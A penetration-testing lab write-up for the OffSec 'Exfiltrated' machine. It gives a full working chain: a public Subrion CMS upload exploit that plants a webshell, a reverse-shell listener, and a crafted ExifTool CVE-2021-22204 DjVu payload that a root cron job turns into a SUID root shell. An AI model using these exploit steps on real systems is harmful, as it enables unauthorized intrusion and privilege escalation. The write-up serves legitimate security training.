![Exfiltrated attack path](/images/lab-writeups/exfiltrated.svg)

# Exfiltrated Write-Up

Source: OffSec

Difficulty: Intermediate

Categories: Linux, Apache, virtual hosting, robots.txt, Subrion CMS, authenticated upload bypass, ExifTool CVE-2021-22204, cron

## Nmap

```bash
nmap -A -oN nmap.txt 192.168.144.163
```

Important output:

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
http-robots.txt: /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/
http-title: Did not follow redirect to http://exfiltrated.offsec/
```

The redirect to `http://exfiltrated.offsec/` indicated name-based virtual hosting.

Add it to `/etc/hosts`:

```bash
echo "192.168.144.163 exfiltrated.offsec" | sudo tee -a /etc/hosts
```

## robots.txt

The disallowed entries were useful:

| Path | Why it matters |
| --- | --- |
| `/backup/` | Potential configs, credentials, source backups |
| `/cron/?` | Possible scheduled job interface |
| `/front/` | Frontend files or unauthenticated pages |
| `/install/` | Version disclosure or incomplete setup |
| `/panel/` | Admin panel |
| `/tmp/` | Temporary files or uploads |
| `/updates/` | Version or update path |

The `/panel/` path led to Subrion CMS.

## Web Application Enumeration

The admin panel showed Subrion CMS v4.2.1.

Gobuster also found interesting paths:

```text
/0/
/updates/
```

Both returned 403, so the next step was version-specific research.

## Searchsploit

```bash
searchsploit subrion
```

Relevant result:

```text
Subrion CMS 4.2.1 - Arbitrary File Upload | php/webapps/49876.py
```

The exploit targets CVE-2018-19422.

Copy the exploit:

```bash
searchsploit -m php/webapps/49876.py
```

## Running the Exploit

```bash
python3 49876.py -u http://192.168.231.163/panel/ --user admin --pass admin
```

The exploit logs in, obtains a CSRF token, uploads a webshell, and returns the shell path.

Example output:

```text
[+] Login Successful!
[+] Upload Success ... Webshell path: http://192.168.231.163/panel/uploads/<randomname>
```

Check for Python on the target:

```bash
which python
which python3
```

Python3 existed:

```text
/usr/bin/python3
```

Use a Python reverse shell and stabilize it:

```bash
nc -nvlp 4444
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
```

## Cron Job Discovery

Inspect `/etc/crontab`:

```bash
cat /etc/crontab
```

Important entry:

```text
* * * * * root bash /opt/image-exif.sh
```

The script:

```bash
cat /opt/image-exif.sh
```

Relevant content:

```bash
IMAGES='/var/www/html/subrion/uploads'
META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

ls $IMAGES | grep "jpg" | while read filename;
do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done
```

The root cron job runs ExifTool against uploaded `.jpg` files every minute.

## ExifTool Vulnerability

The target path relies on CVE-2021-22204, an ExifTool DjVu metadata parsing vulnerability.

The vulnerable pattern involves sanitization before an `eval`-style operation. Certain escape sequences can survive the sanitization process and produce dangerous characters later during evaluation.

Payload concept:

```text
(metadata "\c${system('chmod +s /bin/bash')};")
```

The goal was to make `/bin/bash` SUID root when root's cron job processed the malicious file.

## Building the Payload

Tools needed:

- `djvumake`
- `bzz`
- `exiftool`

Create payload:

```bash
cat payload
(metadata "\c${system('chmod +s /bin/bash')};")
```

Compress:

```bash
bzz payload payload.bzz
```

Create DjVu:

```bash
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
file exploit.djvu
```

Test locally:

```bash
exiftool exploit.djvu
```

The file is still recognized as DjVu, but the target script filters by files containing `jpg`, so copy it with a `.jpg` name:

```bash
cp exploit.djvu exploit.jpg
```

## Triggering the Cron Job

Move the payload into the upload directory:

```bash
cp exploit.jpg /var/www/html/subrion/uploads/
```

Wait for the root cron job to run, then check `/bin/bash`:

```bash
ls -la /bin/bash
```

Expected result:

```text
-rwsr-sr-x 1 root root ... /bin/bash
```

The `s` bit indicates SUID.

Launch root shell:

```bash
/bin/bash -p
id
```

Expected:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```

Read proof:

```bash
cd /root
cat proof.txt
```

## Attack Path

```text
Nmap
-> Virtual host exfiltrated.offsec
-> robots.txt exposes /panel
-> Subrion CMS v4.2.1
-> Authenticated upload bypass
-> Webshell as www-data
-> /etc/crontab reveals root ExifTool job
-> DjVu ExifTool payload copied as .jpg
-> root cron job processes image
-> /bin/bash becomes SUID
-> /bin/bash -p gives root shell
```

## Takeaways

Virtual host redirects should be added to `/etc/hosts` immediately.

`robots.txt` often acts as a map to important application paths.

Admin panels should be checked for CMS name and version.

Authenticated upload bypasses are still valuable when default or weak credentials exist.

Root cron jobs processing user-controlled files are high-risk.

ExifTool CVE-2021-22204 can be triggered through malicious DjVu metadata, even when the file is named with a `.jpg` extension if the processing tool inspects content.
